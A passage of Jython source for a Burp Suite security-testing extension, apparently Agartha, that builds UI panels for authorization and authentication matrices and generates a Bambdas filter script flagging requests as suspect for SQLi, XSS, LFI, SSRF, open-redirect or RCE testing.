        self._cbSiteMapDepth = JComboBox(('Only current URL', 'Max crawl depth is 1', 'Max crawl depth is 2', 'Max crawl depth is 3', 'Max crawl depth is 4', 'Max crawl depth is 5', 'Max crawl depth is 6', 'Max crawl depth is 7', 'Max crawl depth is 8', 'Max crawl depth is 9', 'Max crawl depth is 10'))
        self._cbSiteMapDepth.setPreferredSize(Dimension(150, 27))
        self._cbSiteMapDepth.setSelectedIndex(3)
        self._cbSiteMapDepth.setToolTipText("Webpage spider depth. How many sub-links should the web crawler go?")

        # top panel
        _tabAuthPanel1 = JPanel(BorderLayout())
        _tabAuthPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthPanel1_A.setPreferredSize(Dimension(400, 105))
        _tabAuthPanel1_A.setMinimumSize(Dimension(400, 105))
        _tabAuthPanel1_A.add(self._btnAuthNewUserAdd)
        _tabAuthPanel1_A.add(self._tbAuthNewUser)
        _tabAuthPanel1_A.add(self._cbAuthGETPOST)
        _tabAuthPanel1_A.add(self._btnAuthReset)
        _tabAuthPanel1_A.add(self._btnAuthRun)
        _tabAuthPanel1_A.add(self._cbAuthColoring)
        _tabAuthPanel1_A.add(self._btnSiteMapGeneratorRun)
        _tabAuthPanel1_A.add(self._cbSiteMapDepth)
        _tabAuthPanel1_B = JScrollPane(self._tbAuthHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthPanel1_C = JScrollPane(self._tbAuthURL, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        self._tabAuthSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthPanel1_B, _tabAuthPanel1_C)
        self._tabAuthSplitpaneHttp.setResizeWeight(0.5)
        _tabAuthPanel1.add(_tabAuthPanel1_A, BorderLayout.WEST)
        _tabAuthPanel1.add(self._tabAuthSplitpaneHttp, BorderLayout.CENTER)
        # panel top

        # panel center
        self._lblAuthNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrix = []
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix.setAutoCreateRowSorter(False)
        self.tableMatrix.setSelectionForeground(Color.red)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.setOpaque(True)
        self.tableMatrix.setFillsViewportHeight(True)
        self.tableMatrix_SP = JScrollPane()
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        _tabAuthPanel2 = JPanel()
        _tabAuthPanel2.setLayout(BoxLayout(_tabAuthPanel2, BoxLayout.Y_AXIS))
        _tabAuthPanel2.add(self._lblAuthNotification, BorderLayout.NORTH)
        _tabAuthPanel2.add(self.tableMatrix_SP, BorderLayout.NORTH)
        self.progressBar = JProgressBar()
        self.progressBar.setMaximum(1000000)
        self.progressBar.setMinimum(0)
        _tabAuthPanel2.add( self.progressBar, BorderLayout.SOUTH)
        # panel center

        self._tabAuthPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthPanel.setResizeWeight(0.25)
        self._tabAuthPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabAuthPanel.setTopComponent(_tabAuthPanel1)
        self._tabAuthPanel.setBottomComponent(_tabAuthPanel2)

        # panel bottom
        _tabsReqRes = JTabbedPane()        
        self._requestViewer = self._callbacks.createMessageEditor(self, False)
        self._responseViewer = self._callbacks.createMessageEditor(self, False)
        _tabsReqRes.addTab("Request", self._requestViewer.getComponent())
        _tabsReqRes.addTab("Response", self._responseViewer.getComponent())
        # panel bottom

        self._tabAuthSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthSplitpane.setResizeWeight(0.7)
        self._tabAuthSplitpane.setTopComponent(self._tabAuthPanel)
        self._tabAuthSplitpane.setBottomComponent(_tabsReqRes)

    def _cbAuthenticationEnableFilterFunc(self, ev):

        if self._cbAuthenticationEnableFilter.isSelected():
            self.txAuthenticationEnableKeyWordURL.setVisible(True)
            self._lblAuthenticationEnableFilter2.setVisible(True)
            self._lblAuthenticationDaystoShow.setVisible(True)
            self._cbAuthenticationDaystoShow.setVisible(True)
            self._lblAuthenticationEnableURLGroup.setVisible(True)
            self._cbAuthenticationEnableURLGroup.setVisible(True)
        else:
            self.txAuthenticationEnableKeyWordURL.setVisible(False)
            self._lblAuthenticationEnableFilter2.setVisible(False)
            self._lblAuthenticationDaystoShow.setVisible(False)
            self._cbAuthenticationDaystoShow.setVisible(False)
            self._lblAuthenticationEnableURLGroup.setVisible(False)
            self._cbAuthenticationEnableURLGroup.setVisible(False)

    def _tabAuthenticationUI(self):
        self._cbAuthenticationHost = JComboBox()
        self._cbAuthenticationHost.setPreferredSize(Dimension(250, 27))
        self._cbAuthenticationHost.setToolTipText("Target hostnames. If you dont see your target in here, please click 'Reset' button first.")

        self._btnAuthenticationFetchHistory = JButton("Load Requests", actionPerformed=self.historyFetcher)
        self._btnAuthenticationFetchHistory.setPreferredSize(Dimension(120, 27))
        self._btnAuthenticationFetchHistory.setToolTipText("Load http requests from proxy history.")

        self._btnAuthenticationReset = JButton("Reset", actionPerformed=self.resetAuthentication)
        self._btnAuthenticationReset.setPreferredSize(Dimension(120, 27))
        self._btnAuthenticationReset.setToolTipText("Reset the screen and re-load hostnames.")

        self._btnAuthenticationRun = JButton("RUN", actionPerformed=self.authenticationMatrixFunc)
        self._btnAuthenticationRun.setPreferredSize(Dimension(120, 27))
        self._btnAuthenticationRun.setToolTipText("Execute the task!")
        self._btnAuthenticationRun.setEnabled(False)

        self._cbAuthenticationEnableFilter = JCheckBox('Enable Filters', False, itemStateChanged=self._cbAuthenticationEnableFilterFunc)
        self._cbAuthenticationEnableFilter.setPreferredSize(Dimension(120, 27))
        self._cbAuthenticationEnableFilter.setToolTipText("You can define some conditions, when you load URLs from the history.")

        self._lblAuthenticationEnableURLGroup = JLabel("", SwingConstants.LEFT)
        self._lblAuthenticationEnableURLGroup.setPreferredSize(Dimension(120, 27))
        self._lblAuthenticationEnableURLGroup.setVisible(False)

        self._cbAuthenticationEnableURLGroup = JCheckBox('Enable URL Grouping', True)
        self._cbAuthenticationEnableURLGroup.setPreferredSize(Dimension(250, 27))
        self._cbAuthenticationEnableURLGroup.setVisible(False)
        self._cbAuthenticationEnableURLGroup.setToolTipText("Similar URLs will count as one. (Experimental)")

        self._lblAuthenticationDaystoShow = JLabel("How many days", SwingConstants.LEFT)
        self._lblAuthenticationDaystoShow.setPreferredSize(Dimension(120, 27))
        self._lblAuthenticationDaystoShow.setVisible(False)
        self._lblAuthenticationDaystoShow.setToolTipText("How many days will be processed!")

        self._cbAuthenticationDaystoShow = JComboBox(('Process only last day', 'Process only last 3 days', 'Process only last 7 days', 'All'))
        self._cbAuthenticationDaystoShow.setPreferredSize(Dimension(250, 27))
        self._cbAuthenticationDaystoShow.setVisible(False)
        self._cbAuthenticationDaystoShow.setSelectedIndex(2)

        self._lblAuthenticationEnableFilter2 = JLabel("Keyword in the URL", SwingConstants.LEFT)
        self._lblAuthenticationEnableFilter2.setPreferredSize(Dimension(120, 27))
        self._lblAuthenticationEnableFilter2.setVisible(False)
        self._lblAuthenticationEnableFilter2.setToolTipText("Search keywords in URL, separated by commas. Example: /admin/, user")
        self.txAuthenticationEnableKeyWordURL = JTextField("")
        self.txAuthenticationEnableKeyWordURL.setPreferredSize(Dimension(250, 27))
        self.txAuthenticationEnableKeyWordURL.setVisible(False)
        self.txAuthenticationEnableKeyWordURL.setToolTipText("Search keywords in URL, separated by commas. Example: /admin/, user")

        # panel top
        _tabAuthenticationPanel1 = JPanel(BorderLayout())
        _tabAuthenticationPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthenticationPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthenticationPanel1_A.setPreferredSize(Dimension(400, 105))
        _tabAuthenticationPanel1_A.setMinimumSize(Dimension(400, 105))

        _tabAuthenticationPanel1_A.add(self._cbAuthenticationHost)
        _tabAuthenticationPanel1_A.add(self._btnAuthenticationFetchHistory)
        _tabAuthenticationPanel1_A.add(self._btnAuthenticationReset)
        _tabAuthenticationPanel1_A.add(self._btnAuthenticationRun)
        
        _tabAuthenticationPanel1_A.add(self._cbAuthenticationEnableFilter)
        _tabAuthenticationPanel1_A.add(self._lblAuthenticationEnableURLGroup)
        _tabAuthenticationPanel1_A.add(self._cbAuthenticationEnableURLGroup)
        _tabAuthenticationPanel1_A.add(self._lblAuthenticationDaystoShow)
        _tabAuthenticationPanel1_A.add(self._cbAuthenticationDaystoShow)

        _tabAuthenticationPanel1_A.add(self._lblAuthenticationEnableFilter2)
        _tabAuthenticationPanel1_A.add(self.txAuthenticationEnableKeyWordURL)

        self._urlAddresses = DefaultListModel()
        self.tabAuthenticationJlist = JList(self._urlAddresses)
        self.tabAuthenticationJlist.addListSelectionListener(self.listChange)
        self.tabAuthenticationJlist.setSelectionMode(DefaultListSelectionModel.SINGLE_SELECTION)
        self.tabAuthenticationJlist.setToolTipText("Queued requests.")

        self._tbAuthenticationHeader = JTextPane()
        self._tbAuthenticationHeader.setContentType("text")
        self._tbAuthenticationHeader.setToolTipText("Header details.")
        self._tbAuthenticationHeader.setEditable(False)
        self._tbAuthenticationHeader.setText("")

        _tabAuthenticationPanel1_B = JScrollPane(self.tabAuthenticationJlist, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthenticationPanel1_C = JScrollPane(self._tbAuthenticationHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS)
        self._tabAuthenticationSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthenticationPanel1_B, _tabAuthenticationPanel1_C)
        self._tabAuthenticationSplitpaneHttp.setResizeWeight(0.5)
        _tabAuthenticationPanel1.add(_tabAuthenticationPanel1_A, BorderLayout.WEST)
        _tabAuthenticationPanel1.add(self._tabAuthenticationSplitpaneHttp, BorderLayout.CENTER)
        # panel top

        # panel center
        self._lblAuthenticationNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrixAuthentication = []
        self.tableMatrixAuthentication_DM = CustomDefaultTableModel(self.tableMatrixAuthentication, ('URLs', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'))
        self.tableMatrixAuthentication = JTable(self.tableMatrixAuthentication_DM)
        self.tableMatrixAuthentication.setAutoCreateRowSorter(False)
        self.tableMatrixAuthentication.setSelectionForeground(Color.red)
        self.tableMatrixAuthentication.getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self.tableMatrixAuthentication.getColumnModel().getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self.tableMatrixAuthentication.setOpaque(True)
        self.tableMatrixAuthentication.setFillsViewportHeight(True)
        self.tableMatrixAuthentication_SP = JScrollPane()
        self.tableMatrixAuthentication_SP.getViewport().setView((self.tableMatrixAuthentication))
        _tabAuthenticationPanel2 = JPanel()
        _tabAuthenticationPanel2.setLayout(BoxLayout(_tabAuthenticationPanel2, BoxLayout.Y_AXIS))
        _tabAuthenticationPanel2.add(self._lblAuthenticationNotification, BorderLayout.NORTH)
        _tabAuthenticationPanel2.add(self.tableMatrixAuthentication_SP, BorderLayout.NORTH)
        
        self.progressBarAuthenticationPanel = JProgressBar()
        self.progressBarAuthenticationPanel.setMaximum(1000000)
        self.progressBarAuthenticationPanel.setMinimum(0)
        _tabAuthenticationPanel2.add( self.progressBarAuthenticationPanel, BorderLayout.SOUTH)
        # panel center

        self._tabAuthenticationPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthenticationPanel.setResizeWeight(0.3)
        self._tabAuthenticationPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabAuthenticationPanel.setTopComponent(_tabAuthenticationPanel1)
        self._tabAuthenticationPanel.setBottomComponent(_tabAuthenticationPanel2)

        # panel bottom
        _tabsAuthenticationReqRes = JTabbedPane()
        self._requestViewerAuthentication = self._callbacks.createMessageEditor(self, False)
        self._responseViewerAuthentication = self._callbacks.createMessageEditor(self, False)
        _tabsAuthenticationReqRes.addTab("Request", self._requestViewerAuthentication.getComponent())
        _tabsAuthenticationReqRes.addTab("Response", self._responseViewerAuthentication.getComponent())
        # panel bottom

        self._tabAuthenticationSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthenticationSplitpane.setResizeWeight(0.7)
        self._tabAuthenticationSplitpane.setTopComponent(self._tabAuthenticationPanel)
        self._tabAuthenticationSplitpane.setBottomComponent(_tabsAuthenticationReqRes)

    def _cbBambdasValuableFunc(self, ev):
        if self._cbBambdasValuable.isSelected():
            self._txtBambdasValuable.setEnabled(True)
        else:
            self._txtBambdasValuable.setEnabled(False)

    def _cbBambdasFilesDownFunc(self, ev):
        if self._cbBambdasFilesDownloadable.isSelected():
            self._txtBambdasFilesDownloadable.setEnabled(True)
        else:
            self._txtBambdasFilesDownloadable.setEnabled(False)

    def _cbBambdasSQLiFunc(self, ev):
        if self._cbBambdasSQLi.isSelected():
            self._txtBambdasSQLiKeywords.setEnabled(True)
        else:
            self._txtBambdasSQLiKeywords.setEnabled(False)

    def _cbBambdasXSSFunc(self, ev):
        if self._cbBambdasXSS.isSelected():
            self._txtBambdasXSSKeywords.setEnabled(True)
        else:
            self._txtBambdasXSSKeywords.setEnabled(False)

    def _cbBambdasLFIFunc(self, ev):
        if self._cbBambdasLFI.isSelected():
            self._txtBambdasLFIKeywords.setEnabled(True)
        else:
            self._txtBambdasLFIKeywords.setEnabled(False)

    def _cbBambdasSSRFFunc(self, ev):
        if self._cbBambdasSSRF.isSelected():
            self._txtBambdasSSRFKeywords.setEnabled(True)
        else:
            self._txtBambdasSSRFKeywords.setEnabled(False)

    def _cbBambdasORedFunc(self, ev):
        if self._cbBambdasORed.isSelected():
            self._txtBambdasORedKeywords.setEnabled(True)
        else:
            self._txtBambdasORedKeywords.setEnabled(False)
    
    def _cbBambdasRCEFunc(self, ev):
        if self._cbBambdasRCE.isSelected():
            self._txtBambdasRCEKeywords.setEnabled(True)
        else:
            self._txtBambdasRCEKeywords.setEnabled(False)

    def _cbBambdasSearchinURLFunc(self, ev):
        if self._cbBambdasSearchinURL.isSelected():
            self._cbBambdasSQLi.setEnabled(True)
            if self._cbBambdasSQLi.isSelected():
                self._txtBambdasSQLiKeywords.setEnabled(True)
            self._cbBambdasXSS.setEnabled(True)
            if self._cbBambdasXSS.isSelected():
                self._txtBambdasXSSKeywords.setEnabled(True)
            self._cbBambdasLFI.setEnabled(True)
            if self._cbBambdasLFI.isSelected():
                self._txtBambdasLFIKeywords.setEnabled(True)
            self._cbBambdasSSRF.setEnabled(True)
            if self._cbBambdasSSRF.isSelected():
                self._txtBambdasSSRFKeywords.setEnabled(True)
            self._cbBambdasORed.setEnabled(True)
            if self._cbBambdasORed.isSelected():
                self._txtBambdasORedKeywords.setEnabled(True)
            self._cbBambdasRCE.setEnabled(True)
            if self._cbBambdasRCE.isSelected():
                self._txtBambdasRCEKeywords.setEnabled(True)
            self._cbBambdasValuable.setEnabled(True)
            if self._cbBambdasValuable.isSelected():
                self._txtBambdasValuable.setEnabled(True)
        else:
            if not self._cbBambdasSearchinReq.isSelected():
                self._cbBambdasSQLi.setEnabled(False)
                self._txtBambdasSQLiKeywords.setEnabled(False)
                self._cbBambdasXSS.setEnabled(False)
                self._txtBambdasXSSKeywords.setEnabled(False)
                self._cbBambdasLFI.setEnabled(False)
                self._txtBambdasLFIKeywords.setEnabled(False)
                self._cbBambdasSSRF.setEnabled(False)
                self._txtBambdasSSRFKeywords.setEnabled(False)
                self._cbBambdasORed.setEnabled(False)
                self._txtBambdasORedKeywords.setEnabled(False)
                self._cbBambdasRCE.setEnabled(False)
                self._txtBambdasRCEKeywords.setEnabled(False)
                if not self._cbBambdasSearchinRes.isSelected() and not self._cbBambdasSearchinReq.isSelected():
                    self._cbBambdasValuable.setEnabled(False)
                    self._txtBambdasValuable.setEnabled(False)

    def _cbBambdasSearchinReqFunc(self, ev):
        if self._cbBambdasSearchinReq.isSelected():
            self._cbBambdasSQLi.setEnabled(True)
            if self._cbBambdasSQLi.isSelected():
                self._txtBambdasSQLiKeywords.setEnabled(True)
            self._cbBambdasXSS.setEnabled(True)
            if self._cbBambdasXSS.isSelected():
                self._txtBambdasXSSKeywords.setEnabled(True)
            self._cbBambdasLFI.setEnabled(True)
            if self._cbBambdasLFI.isSelected():
                self._txtBambdasLFIKeywords.setEnabled(True)
            self._cbBambdasSSRF.setEnabled(True)
            if self._cbBambdasSSRF.isSelected():
                self._txtBambdasSSRFKeywords.setEnabled(True)
            self._cbBambdasORed.setEnabled(True)
            if self._cbBambdasORed.isSelected():
                self._txtBambdasORedKeywords.setEnabled(True)
            self._cbBambdasRCE.setEnabled(True)
            if self._cbBambdasRCE.isSelected():
                self._txtBambdasRCEKeywords.setEnabled(True)
            self._cbBambdasValuable.setEnabled(True)
            if self._cbBambdasValuable.isSelected():
                self._txtBambdasValuable.setEnabled(True)
        else:
            if not self._cbBambdasSearchinURL.isSelected():
                self._cbBambdasSQLi.setEnabled(False)
                self._txtBambdasSQLiKeywords.setEnabled(False)
                self._cbBambdasXSS.setEnabled(False)
                self._txtBambdasXSSKeywords.setEnabled(False)
                self._cbBambdasLFI.setEnabled(False)
                self._txtBambdasLFIKeywords.setEnabled(False)
                self._cbBambdasSSRF.setEnabled(False)
                self._txtBambdasSSRFKeywords.setEnabled(False)
                self._cbBambdasORed.setEnabled(False)
                self._txtBambdasORedKeywords.setEnabled(False)
                self._cbBambdasRCE.setEnabled(False)
                self._txtBambdasRCEKeywords.setEnabled(False)
                if not self._cbBambdasSearchinRes.isSelected() and not self._cbBambdasSearchinURL.isSelected():
                    self._cbBambdasValuable.setEnabled(False)
                    self._txtBambdasValuable.setEnabled(False)

    def _cbBambdasSearchinResFunc(self, ev):
        if self._cbBambdasSearchinRes.isSelected():
            self._cbBambdasSearchHTMLCommnets.setEnabled(True)
            if self._cbBambdasSearchHTMLCommnets.isSelected():
                self._txtBambdasSearchHTMLCommnets.setEnabled(True)
            self._cbBambdasFilesDownloadable.setEnabled(True)
            if self._cbBambdasFilesDownloadable.isSelected():
                self._txtBambdasFilesDownloadable.setEnabled(True)
            self._cbBambdasValuable.setEnabled(True)
            if self._cbBambdasValuable.isSelected():
                self._txtBambdasValuable.setEnabled(True)
            self._cbBambdasVulnJS.setEnabled(True)
            if self._cbBambdasVulnJS.isSelected():
                self._txtBambdasVulnJSKeywords.setEnabled(True)
        else:
            self._cbBambdasSearchHTMLCommnets.setEnabled(False)
            self._txtBambdasSearchHTMLCommnets.setEnabled(False)
            self._cbBambdasFilesDownloadable.setEnabled(False)
            self._txtBambdasFilesDownloadable.setEnabled(False)
            self._cbBambdasVulnJS.setEnabled(False)
            self._txtBambdasVulnJSKeywords.setEnabled(False)
            if not self._cbBambdasSearchinReq.isSelected() and not self._cbBambdasSearchinURL.isSelected():
                self._cbBambdasValuable.setEnabled(False)
                self._txtBambdasValuable.setEnabled(False)

    def _cbBambdasHTTPMethodsFunc(self, ev):
        if self._cbBambdasHTTPMethods.isSelected():
            self._txtBambdasHTTPMethods.setEnabled(True)
        else:
            self._txtBambdasHTTPMethods.setEnabled(False)
    
    def _cbBambdasVulnJSFunc(self, ev):
        if self._cbBambdasVulnJS.isSelected():
            self._txtBambdasVulnJSKeywords.setEnabled(True)
        else:
            self._txtBambdasVulnJSKeywords.setEnabled(False)

    def _cbBambdasExtIgnoreFunc(self, ev):
        if self._cbBambdasExtIgnore.isSelected():
            self._txtBambdasExtIgnoreKeywords.setEnabled(True)
        else:
            self._txtBambdasExtIgnoreKeywords.setEnabled(False)

    def funcBambdasRun(self, ev):
        
        for line in self._tbBambdasScopeURLs.getText().splitlines():
            if line.strip().startswith("/*") or line.strip() == "/":
                self._tbBambdasScopeURLs.setText("/")
        
        for line in self._tbBambdasScopeDoneURLs.getText().splitlines():
            if line.strip().startswith("/*") or line.strip() == "/":
                self._lblBambdasNotification2.text = "You can not set root directory '/' in the tested URLs."
                self._lblBambdasNotification2.setForeground(Color.red)
                return

        for line in self._tbBambdasBlackListedURLs.getText().splitlines():
            if line.strip().startswith("/*") or line.strip() == "/":
                self._tbBambdasBlackListedURLs.setText("/")
                if self._tbBambdasScopeURLs.text == self._txBambdasScopeURLs or self._tbBambdasScopeURLs.text.strip() == "" or self._tbBambdasScopeURLs.text.strip().startswith("/*"):
                    self._lblBambdasNotification2.text = "Root directory '/' can't be blacklisted, unless you provide scope URLs."
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return
        
        if self._cbBambdasHTTPMethods.isSelected() and self._txtBambdasHTTPMethods.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The HTTP methods option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasValuable.isSelected() and self._txtBambdasValuable.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The Valuable keywords option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasFilesDownloadable.isSelected() and self._txtBambdasFilesDownloadable.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The Downloadable file extensions option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasSQLi.isSelected() and self._txtBambdasSQLiKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The SQLi-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasXSS.isSelected() and self._txtBambdasXSSKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The XSS-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasLFI.isSelected() and self._txtBambdasLFIKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The LFI-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasSSRF.isSelected() and self._txtBambdasSSRFKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The SSRF-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasORed.isSelected() and self._txtBambdasORedKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The Open Redirect-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasRCE.isSelected() and self._txtBambdasRCEKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The RCE-suspect identifiers option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasVulnJS.isSelected() and self._txtBambdasVulnJSKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The Vulnerable JS Functions option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return
        if self._cbBambdasExtIgnore.isSelected() and self._txtBambdasExtIgnoreKeywords.text.strip().replace(",","") == "" :
            self._lblBambdasNotification2.text = "The File extensions to ignore option is selected, but no input has been provided"
            self._lblBambdasNotification2.setForeground(Color.red)
            return

        bambdas = "/**\n"
        bambdas += " * Bambdas Script - autogenerated by Agartha\n"
        bambdas += " **/\n\n"

        # bambdas += "//logging.logToOutput(\"smt\");\t\t\t// for troubleshooting\n\n"
        if self._cbBambdasforWhat.getSelectedIndex() == 0:
            bambdas += "// 'true' clear colors and notes, 'false' execute the script\n"
            bambdas += "boolean resetScreen = false;\n"
            bambdas += "// 'true' clear colors and notes, 'false' execute the script\n\n"

        bambdas += "// URLs in the scope of testing, White-Listed / Wanted URLs\n"
        if sum(1 for line in self._tbBambdasScopeURLs.text.splitlines() if line.strip() == '/') == 1:
            # There is a '/' in the list, which suppresses the rest of the URLs.
            bambdas += "String[] targetPaths = {\"/.*\"};\n"
        elif self._tbBambdasScopeURLs.text != self._txBambdasScopeURLs and self._tbBambdasScopeURLs.text.strip() != "":
            targetPaths = "{"
            for line in self._tbBambdasScopeURLs.text.splitlines():
                if  line.strip() == "":
                    pass
                elif not line.strip().startswith("/"):
                    self._lblBambdasNotification2.text = "All URLs in White-list should start with '/'"
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return
                else:
                    targetPaths += "\"" + (line.strip().replace("*",".*") + ".*").replace(".*.*", ".*") + "\", "
            if targetPaths != "{":
                targetPaths = targetPaths[:-2]
            targetPaths += "}"
            bambdas += "String[] targetPaths = " + targetPaths + ";\n"
        else:
            # by default includes all - /
            bambdas += "String[] targetPaths = {\"/.*\"};\n"
        bambdas += "// URLs in the scope of testing, White-Listed / Wanted URLs\n\n"

        if self._tbBambdasBlackListedURLs.getText() != '/':
            bambdas += "// Black-Listed / Unwanted URLs\n"
            if self._tbBambdasBlackListedURLs.text != self._txBambdasBlackListedURLs:
                targetBlackListUrls = "{"
                for line in self._tbBambdasBlackListedURLs.text.splitlines():
                    if  line.strip() == "":
                        pass
                    elif not line.strip().startswith("/"):
                        self._lblBambdasNotification2.text = "All URLs in Black-list should start with '/'"
                        self._lblBambdasNotification2.setForeground(Color.red)
                        return
                    else:
                        targetBlackListUrls += "\"" + (line.strip().replace("*",".*") + ".*").replace(".*.*", ".*") + "\", "
                if targetBlackListUrls != "{":
                    targetBlackListUrls = targetBlackListUrls[:-2]
                targetBlackListUrls += "}"
                bambdas += "String[] targetBlackListUrls = " + targetBlackListUrls + ";\n"
                bambdas += "// You can add unwanted URLs to this list to ignore them!\n"
            else:
                bambdas += "String[] targetBlackListUrls = {\"/YouCanPutBlackListURLsHere.*\"};\n"
                bambdas += "// You can add unwanted URLs to this list to ignore them!\n"
            bambdas += "// Black-Listed / Unwanted URLs\n\n"

        bambdas += "// Tested URLs list\n"
        if self._tbBambdasScopeDoneURLs.text != self._txBambdasScopeDoneURLs and self._tbBambdasScopeDoneURLs.text.strip() != "":
            targetPaths = "{"
            for line in self._tbBambdasScopeDoneURLs.text.splitlines():
                if  line.strip() == "":
                    pass
                elif not line.strip().startswith("/"):
                    self._lblBambdasNotification2.text = "All URLs in Already Tested URLs should start with '/'"
                    self._lblBambdasNotification2.setForeground(Color.red)
                    return
                else:
                    targetPaths += "\"" + (line.strip().replace("*",".*") + ".*").replace(".*.*", ".*") + "\", "
            if targetPaths != "{":
                targetPaths = targetPaths[:-2]
            targetPaths += "}"
            bambdas += "String[] targetPathsDone = " + targetPaths + ";\n"
        else:
            # by default includes all - /
            bambdas += "String[] targetPathsDone = {\"/.*\"};\n"
        
        bambdas += "// You can add completed URLs to this list once the security assessment is done!\n"
        bambdas += "// Tested URLs list\n\n"

        # bambdas += "// Tested URLs list\n"
        # bambdas += "String[] targetPathsDone = {\"/YouCanPutDoneURLsHere.*\"};\n"
        # bambdas += "// You can add completed URLs to this list once the security assessment is done!\n"
        # bambdas += "// Tested URLs list\n\n"

        if self._cbBambdasforWhat.getSelectedIndex() == 0:
            bambdas += "// Reset the screen\n"
            bambdas += "if (resetScreen) {\n"
            bambdas += "    requestResponse.annotations().setHighlightColor(HighlightColor.NONE);\n"
            bambdas += "    requestResponse.annotations().setNotes(\"\");\n"
            bambdas += "    return true;\n"
            bambdas += "}\n"
            bambdas += "// Reset the screen\n\n"
        
        if self._cbBambdasScope.isSelected():
            bambdas += "// Display only items that are in scope and have a response.\n"
            bambdas += "if (!requestResponse.hasResponse() || !requestResponse.request().isInScope())\n"
        else:
            bambdas += "// Display only items that have a response\n"
            bambdas += "if (!requestResponse.hasResponse())\n"
        bambdas += "    return false;\n"
        bambdas += "// Display items\n\n"

        if self._cbBambdasforWhat.getSelectedIndex() == 0:
            bambdas += "// check for if already processed\n"
            bambdas += "if ((requestResponse.annotations().highlightColor() != HighlightColor." + self._cbBambdasColorScope.getSelectedItem() + " && requestResponse.annotations().highlightColor() != HighlightColor." + self._cbBambdasColorScopeSecondary.getSelectedItem() + " && requestResponse.annotations().highlightColor() != HighlightColor." + self._cbBambdasColorKeyWords.getSelectedItem() + " && requestResponse.annotations().highlightColor().toString() != \"NONE\") || (!requestResponse.annotations().notes().startsWith(\"Suspicious\") && requestResponse.annotations().notes() !=\"\"))\n"
            bambdas += "\treturn true;\n" 
            bambdas += "// check for if already processed\n\n"

        bambdas += "// general vars\n"
        bambdas += "boolean suspiciousHit = false;\n"
        bambdas += "StringBuilder notesBuilder = new StringBuilder();\n"
        if self._cbBambdasSearchinRes.isSelected() and (self._cbBambdasSearchHTMLCommnets.isSelected() or self._cbBambdasFilesDownloadable.isSelected() or self._cbBambdasValuable.isSelected() or self._cbBambdasVulnJS.isSelected()):
            bambdas += "String responseBody = requestResponse.response().bodyToString();\n"
        if (self._cbBambdasSearchinReq.isSelected() or self._cbBambdasSearchinURL.isSelected()) and (self._cbBambdasSQLi.isSelected() or self._cbBambdasXSS.isSelected() or self._cbBambdasLFI.isSelected() or self._cbBambdasSSRF.isSelected() or self._cbBambdasORed.isSelected() or self._cbBambdasRCE.isSelected() or self._cbBambdasValuable.isSelected()):
            bambdas += "String requestBody  = requestResponse.request().bodyToString();\n"
        bambdas += "var path = requestResponse.request().path().toLowerCase();\n"
